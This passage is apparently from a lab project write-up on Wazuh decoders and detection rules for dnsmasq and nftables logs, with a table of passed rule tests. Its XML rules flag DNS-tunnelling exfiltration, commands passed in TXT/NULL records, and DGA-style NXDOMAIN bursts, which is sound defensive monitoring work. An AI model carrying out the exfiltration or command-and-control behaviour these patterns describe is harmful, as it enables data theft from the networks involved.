+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>antix-dnsmasq-status<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>antix-dnsmasq<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>started|exiting<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^(.+)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>order</span><span class="token punctuation">&gt;</span></span>status_msg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><code>File: /var/ossec/etc/decoders/dnsmasq.xml (Wazuh_Server)</code></p>
+</div></div></div><div class="el-h6"><h6 data-heading="2. Layer 7 DNS Telemetry Analysis" dir="auto" class="heading" id="2._Layer_7_DNS_Telemetry_Analysis_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>2. Layer 7 DNS Telemetry Analysis</h6></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>Implemented DNS anomaly detection rules in Wazuh to identify characteristics commonly associated with DNS tunneling, such as unusually long query names and excessive TXT/NULL query activity.</li>
+</ul></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Captures Some Possible DNS-based Attacks</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">Rule <code>100214</code> and <code>100215</code> will fire when the same IP performed a DNS query for long domain + txt/null and long domain + common record type respectively. These are possible indicators of exfiltration. Rule <code>100211</code> will trigger a level 4 alert when same source IP is requested for txt (typically used by attackers to transfer commands to the infected host) and null (rarely seen on production environment). Rule <code>100220</code> will trigger a level 7 alert when the same source IP performed 20 queries for non-existent domain within 60 second which can identify possible DGA attacks.</p>
+<pre class="language-xml"><code data-line="2" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100214<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100201<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns_action<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>query\[(TXT|NULL)\]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^.{60,}$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS query exceeded expected domain length threshold using uncommon record type.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100215<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100201<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns_action<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>query\[(A|AAAA|CNAME|SRV|MX|PTR)\]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^.{60,}$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS query exceeded expected domain length threshold using common record type.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100211<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100201<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns_action<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>query\[(TXT|NULL)\]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS query observed for uncommon resource record type.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1071.004<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100207<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>resolved_to<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>NXDOMAIN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS response returned NXDOMAIN status.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100220<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span> <span class="token attr-name">frequency</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">timeframe</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>100207<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>same_srcip</span> <span class="token punctuation">/&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Repeated NXDOMAIN responses observed from same source IP. Possible DGA-like domain activity or reconnaissance behavior.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1568.002<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><code>File: /var/ossec/etc/rules/100200-dnsmasq.xml (Wazuh_Server)</code></p>
+</div></div></div><div class="el-h6"><h6 data-heading="3. Basic Behavioral Detection Rule over Hardcoded Signature" dir="auto" class="heading" id="3._Basic_Behavioral_Detection_Rule_over_Hardcoded_Signature_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>3. Basic Behavioral Detection Rule over Hardcoded Signature</h6></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>Implemented behavioral DNS detection by monitoring abnormal NXDOMAIN response frequency from individual hosts. This helps identify potential DGA activity where a malware is looking for the command-and-control server.</li>
+</ul></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Detecting Possible DGA Attack</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">The nature of DGA (Domain Generation Algorithm) attacks makes it extremely difficult for hardcoded firewall signatures to detect and completely block them. So I implemented a behavioral ruleset that monitors and generates a high-severity alert when it detected a host querying 20 non-existent domains within 60 seconds which could be an indicator of DGA activity.</p>
+<pre class="language-xml"><code data-line="2" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100203<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100200<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns_action<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>reply<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS response received from upstream resolver.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100207<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100203<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>resolved_to<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>NXDOMAIN<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>DNS response returned NXDOMAIN status.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100220<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span> <span class="token attr-name">frequency</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">timeframe</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>100207<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>same_srcip</span> <span class="token punctuation">/&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Repeated NXDOMAIN responses observed from same source IP. Possible DGA-like domain activity or reconnaissance behavior.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1568.002<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+</div></div></div><div class="el-h6"><h6 data-heading="4. Reduced Alert Fatigue" dir="auto" class="heading" id="4._Reduced_Alert_Fatigue_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>4. Reduced Alert Fatigue</h6></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>Designed correlation-based detection rules using frequency and timeframe thresholds to reduce low-confidence alerts. Informational events are retained for visibility, while higher severity alerts require repeated suspicious behavior patterns.</li>
+</ul></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Frequency-based Rule Design </div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">While every log is decoded, many are retained solely for backend visibility and correlation. Base rules will rarely trigger on a single log, instead, it must meet the specified frequency thresholds or trigger a chain of rules in a short period of time. </p>
+<p dir="auto"><span alt="Pasted image 20260822233457.png" src="_files/pasted-image-20260822233457.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260822233457.png" src="_files/pasted-image-20260822233457.png" target="_self"></span></p>
+</div></div></div><div class="el-h5"><h5 data-heading="III. Challenges" dir="auto" class="heading" id="III._Challenges_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>III. Challenges</h5></div><div class="el-table" dir="ltr" style="overflow-x: auto;"><table>
+<thead>
+<tr>
+<th dir="ltr">Challenges</th>
+<th dir="ltr">Probable Cause</th>
+<th dir="ltr">Fixes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td dir="ltr">Existing parent decoder is not valid <code>ERROR: (2101): Parent decoder name invalid: 'kernel'.</code></td>
+<td dir="ltr">A custom decoder is accessing a built-in parent decoder</td>
+<td dir="ltr">I redeclared the parent decoder (<code>kernel</code>) along with the custom nftables decoder.</td>
+</tr>
+<tr>
+<td dir="ltr">Inconsistent <code>nftables</code> log fields and different <code>dnsmasq</code> log formats.</td>
+<td dir="ltr">Developer implementation, multi-line log formats.</td>
+<td dir="ltr">I used option regex for fields that are sometimes missing on the logs. <br>I created separate decoders to match multi-line logs where option regex would make decoders difficult to read.</td>
+</tr>
+<tr>
+<td dir="ltr">Verifying whether all possible log formats will match the decoders.</td>
+<td dir="ltr">No official collections of possible logs that will be generated by the software used.<br>I customized my nftables log structure using the log prefix.</td>
+<td dir="ltr">Observed the actual logs generated and used Gen AI LLMs to hypothesize possible variations based on the available fields.</td>
+</tr>
+<tr>
+<td dir="ltr">Balancing parsing precision over CPU compute overhead</td>
+<td dir="ltr">Wazuh's default <code>os_regex</code> is highly efficient but lacks the ability to match complex patterns.</td>
+<td dir="ltr">Used <code>pcre2</code> regex to ensure precise telemetry mapping while using <code>os_regex</code> for parent filters.</td>
+</tr>
+<tr>
+<td dir="ltr">Custom decoders are not parsing the firewall logs on <code>wazuh-logtest</code></td>
+<td dir="ltr">I used a sample log from wazuh's <code>archive.log</code> which is different from actual log due to rsyslog forwarding and preprocessing.</td>
+<td dir="ltr">I used the raw log generated directly on the firewall host.</td>
+</tr>
+<tr>
+<td dir="ltr">Invalid packets are not arriving to the firewall</td>
+<td dir="ltr">Invalid packets do not arrive from a lab host to the lab firewall.<br>Lab router drops invalid packets despite the SPI feature being disabled.</td>
+<td dir="ltr">Disabled <code>rp_filter</code> on the lab firewall.<br>Used the VPN peer (aws-gateway) to send invalid packets directly to the lab firewall.</td>
+</tr>
+</tbody>
+</table></div><div class="el-h5"><h5 data-heading="IV. Validation and Testing" dir="auto" class="heading" id="IV._Validation_and_Testing_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>IV. Validation and Testing</h5></div><div class="el-p"><p dir="auto">The test summary below shows that all rules level &gt;= 3 were triggered and displayed* on the Wazuh Dashboard.</p></div><div class="el-table" dir="ltr" style="overflow-x: auto;"><table>
+<thead>
+<tr>
+<th dir="ltr">Rule Description</th>
+<th dir="ltr">ID</th>
+<th dir="ltr">Level</th>
+<th dir="ltr">Test Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td dir="ltr">dnsmasq started</td>
+<td dir="auto">100206</td>
+<td dir="auto">3</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">dnsmasq stopped</td>
+<td dir="auto">100208</td>
+<td dir="auto">3</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Invalid packet **</td>
+<td dir="auto">100303</td>
+<td dir="auto">3</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Txt/null resource record type</td>
+<td dir="auto">100211</td>
+<td dir="auto">4</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated Invalid packets **</td>
+<td dir="auto">100310</td>
+<td dir="auto">5</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated packet with blocked IP</td>
+<td dir="auto">100311</td>
+<td dir="auto">6</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Extreme packet drop</td>
+<td dir="auto">100331</td>
+<td dir="auto">8</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated Nxdomain</td>
+<td dir="auto">100220</td>
+<td dir="auto">7</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated uncommon TLD</td>
+<td dir="auto">100223</td>
+<td dir="auto">6</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated Txt/null + long domain</td>
+<td dir="auto">100230</td>
+<td dir="auto">9</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated Txt/Null</td>
+<td dir="auto">100221</td>
+<td dir="auto">8</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated long domain</td>
+<td dir="auto">100222</td>
+<td dir="auto">8</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Private IP on WAN interface</td>
+<td dir="auto">100312</td>
+<td dir="auto">8</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Packet with blocked IP</td>
+<td dir="auto">100313</td>
+<td dir="auto">7</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Repeated packet drop</td>
+<td dir="auto">100330</td>
+<td dir="auto">7</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Uncommon TLD</td>
+<td dir="auto">100213</td>
+<td dir="auto">4</td>
+<td dir="ltr">passed</td>
+</tr>
+<tr>
+<td dir="ltr">Txt/null + long domain</td>
+<td dir="auto">100214</td>
+<td dir="auto">5</td>
+<td dir="ltr">passed</td>
+</tr>
+</tbody>
+</table></div><div class="el-p"><p dir="auto">*Some rules that were tested and verified to be working are not included in the test cases below.<br>
